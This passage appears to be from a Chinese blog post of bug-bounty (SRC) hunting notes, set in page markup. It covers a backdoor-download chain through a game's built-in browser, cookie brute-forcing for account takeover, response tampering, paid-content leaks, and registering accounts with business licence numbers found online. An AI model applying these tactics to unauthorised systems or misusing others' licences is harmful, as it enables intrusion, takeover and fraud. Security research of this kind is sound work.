class="string">&quot;file&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在浏览器打开这个 HTML，点击”预览”，就可以打开本地的文件管理器了（浏览器的权限打开）。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：所以，一切都联系起来了——通过游戏内置的浏览器 + form.html 可以查看到具体的文件信息（文件路径），比如打开、解压重命名等。如果是 Windows 的文件管理器就可以直接 cmd 了就很方便了，Ubuntu 似乎好像不行，有待研究。不过都一样，在文件系统中找到后门，点击打开实际上就执行了后门程序，这样就实现 Getshell。</p>
+</blockquote>
+<p><strong>最终逻辑链</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客服功能 → 发送恶意链接 → 内置浏览器打开 → 加载外部 JS → </span><br><span class="line">自动下载后门文件 → form 表单打开文件管理器 → 定位后门文件 → </span><br><span class="line">点击执行 → Getshell</span><br></pre></td></tr></table></figure>
+
+<h2 id="9-2-案例二：Dirsearch-跑出敏感目录"><a href="#9-2-案例二：Dirsearch-跑出敏感目录" class="headerlink" title="9.2 案例二：Dirsearch 跑出敏感目录"></a>9.2 案例二：Dirsearch 跑出敏感目录</h2><p>这个就比较搞笑了，dirsearch 跑了一下敏感目录就可能爬出来了，也是一种要跳出固定思维的一种方式吧。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个案例的启示——当你面对一个看起来防护很严的系统时，不要只盯着复杂的技术漏洞。有时候最简单的方法（扫目录、看 robots.txt、翻 JS 源码）就能有意外收获。<strong>不要因为方法简单就跳过它</strong>。</p>
+</blockquote>
+<hr>
+<h1 id="十、准备工作与资产梳理"><a href="#十、准备工作与资产梳理" class="headerlink" title="十、准备工作与资产梳理"></a>十、准备工作与资产梳理</h1><h2 id="10-1-环境配置"><a href="#10-1-环境配置" class="headerlink" title="10.1 环境配置"></a>10.1 环境配置</h2><ul>
+<li>对资产进行数据处理和分析整理</li>
+<li>知识储备：前面八期录播加知识星球加文档</li>
+<li>设备环境配置齐全</li>
+<li>01：APP 抓包</li>
+<li>02：小程序抓包</li>
+<li>03：APP 反编译与小程序反编译工具</li>
+</ul>
+<h2 id="10-2-资产收集流程"><a href="#10-2-资产收集流程" class="headerlink" title="10.2 资产收集流程"></a>10.2 资产收集流程</h2><p>多款子域名收集工具收集后进行数据处理 → 子域名存活处理 → 最后截图选取资产挖掘。</p>
+<p>APP 使用七麦数据进行 APP 下载，尝试挖掘。</p>
+<p>小蓝本进行边缘资产查看（注意官方是否收取子公司）。</p>
+<h2 id="10-3-思路打开——角色切换法"><a href="#10-3-思路打开——角色切换法" class="headerlink" title="10.3 思路打开——角色切换法"></a>10.3 思路打开——角色切换法</h2><p>一些思路的打开，比如挖掘小红书，用户身份分为普通用户、内容发布者、商家等等。每个人都是可以是用户，那就是说大家都可以去挖”普通用户”层面的漏洞。</p>
+<p><strong>那我们能不能到咸鱼去购买一个商家号，然后去挖掘商家号中特有的功能点的漏洞？</strong></p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个思路的本质是<strong>突破身份限制</strong>。很多 SRC 挖掘者因为”我没有商家账号”就放弃了商家端的功能测试。但如果你愿意花几十块买个商家号，你就获得了一个别人没有的测试视角。<strong>攻击面的大小取决于你拥有多少种身份</strong>——每多一个身份，就多一个看系统的角度。</p>
+</blockquote>
+<h2 id="10-4-返回包也是可以改的"><a href="#10-4-返回包也是可以改的" class="headerlink" title="10.4 返回包也是可以改的"></a>10.4 返回包也是可以改的</h2><p>不要只知道改请求包，返回包也是可以改的。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：改返回包能做什么？假设前端逻辑是”后端返回 <code>vip: true</code>，前端就展示 VIP 功能”——你如果能在返回包到达浏览器之前把 <code>vip: false</code> 改成 <code>vip: true</code>，前端就会以为你是 VIP，把隐藏的功能按钮亮出来。有些功能<strong>后端鉴权是完整的，但前端根本没有调用后端去验证，而是信了登录时返回的一个字段</strong>——你改了那个字段，就等于改了前端对你的”身份认知”。最典型的场景：登录返回包里有个 <code>role: &quot;user&quot;</code>，你改成 <code>role: &quot;admin&quot;</code>，前端就给你展示管理后台入口——点进去可能没有数据（后端鉴权挡了），但也可能后端也没做鉴权（因为开发以为”这个入口只有管理员能看到”）。</p>
+<p><strong>所以改返回包的核心思路是：欺骗前端，让前端帮你发现隐藏的攻击面。</strong> 这是”前端隐藏 ≠ 后端保护”的一个实际应用。</p>
+</blockquote>
+<h2 id="10-5-一个小众功能点的-cookie-爆破-→-全站接管"><a href="#10-5-一个小众功能点的-cookie-爆破-→-全站接管" class="headerlink" title="10.5 一个小众功能点的 cookie 爆破 → 全站接管"></a>10.5 一个小众功能点的 cookie 爆破 → 全站接管</h2><p>现在我们发现某个网站平台的某个主页接口功能的 cookie 存在问题，被我们爆破成功。比如主页点赞问题，账号 1 的 cookie 被复制到账号 2 的点赞数据包中依然点赞成功，这时候我们就要有<strong>扩大影响</strong>的思维。</p>
+<p>我们点击个人主页，此时发现了 URL 的子域名变了（不是 path 变了），这时候就要猜想是不是整个服务框架都存在这个问题？我要继续找什么功能点爆破？最好找一些能交互的地方，或简单的说只要可以越权的地方，比如 <code>CET creator/getauthorinfo</code> 这些返回个人信息的接口，然后爆破 cookie 实现接管其他用户的创作中心。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个场景告诉我们的核心思维是——<strong>某个很小众的功能出现问题，可能是整个站都存在这种问题</strong>。因为 cookie 的生成和校验通常是统一的（在网关层或公共组件中实现），一个接口存在 cookie 可爆破，大概率所有接口都存在。</p>
+<p>那爆破 cookie 到底是爆破什么地方？<strong>爆破不变的地方。</strong></p>
+<p><strong>再深一层——为什么子域名变了说明问题更大？</strong> 因为不同子域名往往对应不同的后端服务，如果同一个 cookie 在 <code>www.a.com</code> 和 <code>creator.a.com</code> 下都能工作，说明 cookie 的签发和校验逻辑是在<strong>网关层或 SSO 单点登录层</strong>统一实现的——这不是某一个业务的漏洞，而是<strong>整个认证体系的漏洞</strong>。本质上你在测试的不是”这个接口有没有鉴权”，而是”这个 SSO 体系的 cookie 有没有可预测性”。两者的危害差了一个数量级：前者影响一个功能，后者影响所有接入这个 SSO 的服务。</p>
+<p><strong>所以当你发现一个 cookie 可爆破时，第一个动作不是庆祝，而是测试这个 cookie 在哪些子域名下有效。</strong> 这决定了你的漏洞是”单点 bug”还是”全站沦陷”。</p>
+</blockquote>
+<p><strong>总结一下</strong>：由点赞功能的 cookie 爆破 → 实现任意用户接管。</p>
+<p><strong>关于 cookie 爆破的方法论</strong>：</p>
+<ol>
+<li>创建两个账号，大小号对比 cookie 哪里相同哪里不同。</li>
+<li>删除 cookie 参数一步步验证哪个是决定性参数。</li>
+<li>如果发现起决定性作用的 cookie 参数的每一位都是不一样的，还是先像老方法尝试逐位爆破。</li>
+<li>可能出现有的位成功了，有的位不成功。实际上这种情况是——整个 cookie 中某些位的遍历有效。有些厂商很”恶心”，将这个 cookie 参数搞成 64 位（让人以为是 hash），实际上就是这种某些位的遍历有效。</li>
+</ol>
+<blockquote>
+<p><strong>再深一层——“某些位有效某些位无效”说明了什么？</strong> 这说明 cookie 的结构不是纯随机的。它可能是<strong>复合结构</strong>：前 8 位是用户 ID 的 hex、中间几位是时间戳、后面是 HMAC。所以有些位变了你还是”合法用户”（只是换了一个用户），有些位变了就”签名校验失败”了。<strong>逐位爆破不只是破 cookie，也是在逆向 cookie 的编码结构</strong>——你通过每一位的”是否有效”来推断这一位属于 cookie 的哪个逻辑段。这就是从”能不能用”反推”它是什么”。</p>
+</blockquote>
+<blockquote>
+<p><strong>重要</strong>：如果这个 cookie 参数是 hash 出来的就没必要爆破了。</p>
+</blockquote>
+<h2 id="10-6-付费内容——看完免费部分就有线索了"><a href="#10-6-付费内容——看完免费部分就有线索了" class="headerlink" title="10.6 付费内容——看完免费部分就有线索了"></a>10.6 付费内容——看完免费部分就有线索了</h2><p>付费免费看的思路：抓付费视频数据包，看返回包（可能就直接将付费视频的链接返回出来的），F12 全局搜索 <code>play_url</code>。</p>
+<p>比如，我看了一个付费视频，网站的观看历史、我的收藏等等是否都存在这个付费视频的。本来就是这属于前端泄露，属于一个高危。提交之后，可能是观看历史这个接口没有修复，又可以提交……网站是修复了，但是 APP 和小程序呢，可能就没有修复了，又可以去刷了。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这里的核心思维——<strong>修复是局部的、渐进的</strong>。Web 端修了不代表 APP 端修了，APP 端修了不代表小程序修了。每个端是独立开发的，修复也是独立部署的。所以你发现一个漏洞后，不光要看”有没有修”，还要看”所有端都修了吗”——这往往意味着一个漏洞可以提交多次。</p>
+<p><strong>再深一层——这背后是一个更通用的”漏洞复现窗口”概念</strong>：一家公司的安全体系是<strong>分层的、异步的</strong>。同一个漏洞在不同端可能由不同团队负责，修复节奏完全不同。Web 端可能一周修好，APP 端因为发版周期可能要等一个月，小程序端可能被外包团队遗忘了。所以<strong>发现一个漏洞 → 提交 Web 端 → 等修复 → 测 APP 端 → 提交 APP 端 → 等修复 → 测小程序端</strong>——这不是重复提交，而是合理利用不同端的修复时间差。但要注意：这招只在”同一漏洞、不同端独立修复”的情况下合规，不要恶意反复提交同一漏洞。</p>
+</blockquote>
+<hr>
+<h2 id="10-7-企业账号注册——没有营业执照怎么办？"><a href="#10-7-企业账号注册——没有营业执照怎么办？" class="headerlink" title="10.7 企业账号注册——没有营业执照怎么办？"></a>10.7 企业账号注册——没有营业执照怎么办？</h2><p>对于企业 SRC，发现一个主页页面是注册企业账号的，这里就劝退了很多人，因为都在想我没有企业啊，无法注册企业账号（这个有联系到之前的注册店铺账号问题）。</p>
+<p><strong>思路</strong>：上咸鱼找？直接百度搜索一些营业执照，用这个营业执照的号注册。如果注册成功就很好了，就可以进行测试那些功能了。</p>
+<p>比如这里面的支付功能，抓取支付功能的数据包：price 参数？商品 id？有点考运气吧。改返回包？</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个思路和前面”买商家号”一脉相承——<strong>身份门槛是别人放弃的理由，也是你的竞争优势</strong>。越多人因为门槛放弃，这个攻击面的竞争就越少。营业执照在百度上可以搜到（很多公司公示信息里包含），注册成功后你就获得了别人没有的测试视角。</p>
+</blockquote>
+<hr>
+<h1 id="附：这篇笔记背后的”元思维”"><a href="#附：这篇笔记背后的”元思维”" class="headerlink" title="附：这篇笔记背后的”元思维”"></a>附：这篇笔记背后的”元思维”</h1><p>写到这里，回头看整篇笔记，你会发现有几个思维模式反复出现，跨章节、跨漏洞类型地贯穿始终。它们不是任何具体的”技巧”，而是<strong>产生技巧的方法</strong>——相当于”挖漏洞的底层操作系统”。</p>
+<h2 id="思维一：无假设测试（Assume-Nothing）"><a href="#思维一：无假设测试（Assume-Nothing）" class="headerlink" title="思维一：无假设测试（Assume Nothing）"></a>思维一：无假设测试（Assume Nothing）</h2><p>开发者假设”用户不会删 cookie”→ 你删了。开发者假设”隐藏接口没人知道”→ 你从 JS 里翻出来了。开发者假设”OCR 识别的文字不需要过滤”→ 你拍了一张 XSS payload 的照片。</p>
+<p><strong>每一次漏洞发现，本质上都是对一个”隐含假设”的证伪。</strong></p>
+<p>所以挖洞时，养成一个习惯：每看到一个功能，问自己”开发者在这里假设了什么？”——然后去打破那个假设。这比记忆任何具体 Payload 都重要，因为 Payload 会过时，但”挑战假设”这个思维方式永远有效。</p>
+<h2 id="思维二：信号识别（Signal-Recognition）"><a href="#思维二：信号识别（Signal-Recognition）" class="headerlink" title="思维二：信号识别（Signal Recognition）"></a>思维二：信号识别（Signal Recognition）</h2><ul>
+<li>500 ≠ 失败，它是”门开了”的信号</li>
+<li>返回包里的参数名 ≠ 无关信息，它是”后端数据结构”的信号</li>
+<li>sleep 45 秒 ≠ bug，它是”SQL 被执行了 3 次”的信号</li>
+<li>URL 的子域名变了 ≠ 无所谓，它是”全站共享认证体系”的信号</li>
+</ul>
+<p><strong>同样的现象，普通人看到的是噪音，挖洞的人看到的是信号。</strong> 差异在于你脑子里有没有一个”信号→含义”的映射表。这篇笔记里所有的”推理深挖”和”再深一层”，都是在帮你建立这个映射表。</p>
+<h2 id="思维三：扩大影响（Amplify）"><a href="#思维三：扩大影响（Amplify）" class="headerlink" title="思维三：扩大影响（Amplify）"></a>思维三：扩大影响（Amplify）</h2><p>这可能是整篇笔记出现频率最高的词。不是偶然——它是 SRC 挖洞从”低危”到”高危”的关键跳板。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">局部发现 → 横向复制（同模块其他接口）</span><br><span class="line">         → 纵向升级（只读变读写、信息泄露变账号接管）</span><br><span class="line">         → 跨端扩展（Web → APP → 小程序）</span><br><span class="line">         → 链条组合（CSRF + XSS + Token 劫持）</span><br></pre></td></tr></table></figure>
+
+<p><strong>不要孤立地评估一个 bug。</strong> 把你发现的每个小问题放在这张”扩展示意图”上，看看它能走到多远。</p>
+<h2 id="思维四：成本不对称（Cost-Asymmetry）"><a href="#思维四：成本不对称（Cost-Asymmetry）" class="headerlink" title="思维四：成本不对称（Cost Asymmetry）"></a>思维四：成本不对称（Cost Asymmetry）</h2><p>这个思维虽然没有在正文里直接命名，但它解释了”为什么这些漏洞会存在”：</p>
+<ul>
+<li>加锁要成本 → 所以冷门功能没锁 → 所以并发能成功</li>
+<li>全量校验要成本 → 所以 cookie 用固定值 → 所以可以爆破</li>
+<li>测试环境防护要成本 → 所以测试环境没 WAF → 所以签名放在前端</li>
+<li>多端统一过滤要成本 → 所以 APP 端过滤松 → 所以 Web 注不进去就去 APP</li>
+</ul>
+<p><strong>攻击者的优势在于：你只需要找到一条路，防守者需要守住所有路。</strong> 成本不对称是攻击方永远的利好。当你理解了”什么东西会让防守方觉得贵”，你就能预测”哪里最可能没防住”。</p>
+<hr>
+<p><em>持续更新中…</em></p>
+
+		  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+
+		  <script>
+		    // 计算字数与阅读时长，同时更新阅读进度条
+		    (function() {
+		      var content = document.querySelector('.mypage');
+		      if (content) {
+		        var text = content.innerText || content.textContent;
+		        // 中文字符（含 CJK 扩展区 + 标点），按字符计数
+		        var chineseChars = (text.match(/[一-鿿㐀-䶿豈-﫿　-〿＀-￯]/g) || []).length;
+		        // 英文/数字按字符计（非词），与 CSDN 统计方式一致
+		        var latinChars = (text.match(/[a-zA-Z0-9]/g) || []).length;
+		        var wordCount = chineseChars + latinChars;
+		        // 阅读时长：中文约 300 字/分钟，英文约 200 词/分钟
+		        var englishWords = (text.match(/[a-zA-Z0-9]+/g) || []).length;
+		        var readingTime = Math.max(1, Math.ceil(chineseChars / 300 + englishWords / 200));
+		        var wcEl = document.getElementById('word-count');
+		        var rtEl = document.getElementById('reading-time');
+		        if (wcEl) wcEl.textContent = '~' + wordCount + ' 字';
+		        if (rtEl) rtEl.textContent = '约 ' + readingTime + ' 分钟';
+		      }
+		      // 阅读进度条
+		      var bar = document.getElementById('reading-progress-bar');
+		      if (bar) {
+		        window.addEventListener('scroll', function() {
+		          var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+		          var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+		          var progress = docHeight > 0 ? Math.min(100, (scrollTop / docHeight) * 100) : 0;
+		          bar.style.width = progress + '%';
+		        });
+		      }
+		    })();
+		  </script>
+		</div>
+
+		
+		<span id="" class="leancloud-visitors view" data-flag-title="SRC挖掘思路_V1.1">
+			<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+		</span>
+		
+		
+		<div>
+	  	<center>
+
+		<div class="pagination">
+
+    
+    
+    <a href="/2026/03/23/BloodHound/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2026/02/03/crawlers基础/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+	    </center>
+		</div>
+
+		<!-- comment -->
+		
+			<section id="comments" class="comments">
+				<style>
+				.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+				@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+				</style>
+				<div id="vcomment" class="comment"></div>
+<script>
+// 延迟加载评论系统
+window.addEventListener('load', function() {
+  setTimeout(function() {
+    var script = document.createElement('script');
+    script.src = 'https://unpkg.com/valine@1.5.1/dist/Valine.min.js';
+    script.onload = function() {
+      var valineConfig = {"enable":true,"appId":"22F2XnoONZRtEbXvXO1SDcjS-gzGzoHsz","appKey":"bIFSRG6LeUO90VdfRBHUXNQs","placeholder":"说点什么吧~","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+      valineConfig.el = '#vcomment';
+      valineConfig.recordIP = true;
+      valineConfig.serverURLs = 'https://22f2xnoo.api.lncldglobal.com';
+      new Valine(valineConfig);
+    };
+    document.head.appendChild(script);
+  }, 1000); // 延迟1秒加载
+});
+</script>
+			</section>
+		
+		
+		
+		</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+		<div id="side_meta">
+			<div class="col-md-3 sticky-meta" id="post_meta"> 
+
+	<!-- small fixed card (date + brief meta) -->
+	<div class="top-card">
+		<!-- date -->
+		
+		<div class="meta-widget">
+		<i class="fa fa-clock-o"></i>
+		2026-03-09
+		</div>
+		
+
+		<!-- brief categories/tags inside fixed card -->
+		
+		<div class="meta-widget small-cats">
+			<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>
+			<ul id="categorys" class="tag_box list-unstyled collapse in">
+				  
+  <li>
+    <li><a href="/categories/网络安全/">网络安全<span>33</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/">SRC&渗透<span>5</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/我的SRC/">我的SRC<span>2</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/我的SRC/思路/">思路<span>1</span></a></li>
+  </li>
+
+			</ul>
+		</div>
+		
+
+		
+		<div class="meta-widget small-tags">
+			<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+			<ul id="tags" class="tag_box list-unstyled collapse in">
+				  
+  <li><a href="/tags/SRC/">SRC<span>2</span></a></li>
+			</ul>
+		</div>
+		
+	</div>
+
+	<!-- All Categories: sticky within sidebar area -->
+	<div class="category-stick" id="category-stick">
+		
+<div class="widget-wrap">
+  <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
+  <div class="widget category-tree">
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">33</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">5</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/">我的SRC</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%80%9D%E8%B7%AF/">思路</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%8A%A5%E5%91%8A/">报告</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">17</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">11</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+  </div>
+</div>
+
+
+<style>
+/* Hacker / Terminal Style Category Tree */
+.category-tree .hacker-category-list {
+  padding-left: 20px;
+  font-family: 'Consolas', 'Courier New', monospace;
+  color: #fff;
+  list-style-type: circle; /* 'o' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list {
+  list-style-type: square; /* '■' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list .hacker-category-list {
+  list-style-type: square;
+}
+
+.category-tree .hacker-category-list-item {
+  margin: 6px 0;
+}
+
+.category-tree .hacker-category-list-link {
+  background-color: rgba(43, 188, 138, 0.1);
+  color: #2bbc8a;
+  text-decoration: none;
+  padding: 1px 6px;
+  font-weight: bold;
+  display: inline-block;
+}
+
+.category-tree .hacker-category-list-link:hover {
+  background-color: rgba(43, 188, 138, 0.2);
+  text-decoration: none;
+}
+
+.category-tree .hacker-category-list-count {
+  color: #2bbc8a;
+  margin-left: 5px;
+}
+</style>
+	</div>
+
+	<!-- article TOC placed below the category list; should scroll with page -->
+	<div class="toc-wrapper">
+		<div class="toc-widget">
+		
+			 <div class="toc">
+				 <span class="toc-title"><i class="fa fa-list"></i> Contents</span>
+				<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%B8%80%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E9%82%A3%E4%BA%9B%E2%80%9D%E5%8F%A6%E7%B1%BB%E2%80%9D%E7%9A%84%E6%8C%96%E6%8E%98%E8%A7%92%E5%BA%A6"><span class="toc-article-text">一、逻辑漏洞——那些”另类”的挖掘角度</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-1-Cookie-%E9%87%8C%E7%9A%84%E5%8F%82%E6%95%B0%EF%BC%8C%E5%88%A0%E7%9D%80%E5%88%A0%E7%9D%80%E5%B0%B1%E5%87%BA%E6%B4%9E%E4%BA%86"><span class="toc-article-text">1.1 Cookie 里的参数，删着删着就出洞了</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-2-URL-%E5%92%8C-POST-%E5%8F%82%E6%95%B0%E9%83%BD%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%97%A0%E5%85%B3%E7%B4%A7%E8%A6%81%EF%BC%8C%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-article-text">1.2 URL 和 POST 参数都看起来无关紧要，怎么办？</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-3-%E6%AF%8F%E4%B8%AA%E5%8A%9F%E8%83%BD%E7%82%B9%E9%83%BD%E6%8A%93%E4%B8%80%E9%81%8D%E5%8C%85"><span class="toc-article-text">1.3 每个功能点都抓一遍包</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-4-%E5%BF%83%E6%80%81"><span class="toc-article-text">1.4 心态</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-5-%E6%84%9F%E5%8F%97%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E2%80%9D%E9%AD%85%E5%8A%9B%E2%80%9D%EF%BC%9A%E5%B9%B6%E5%8F%91"><span class="toc-article-text">1.5 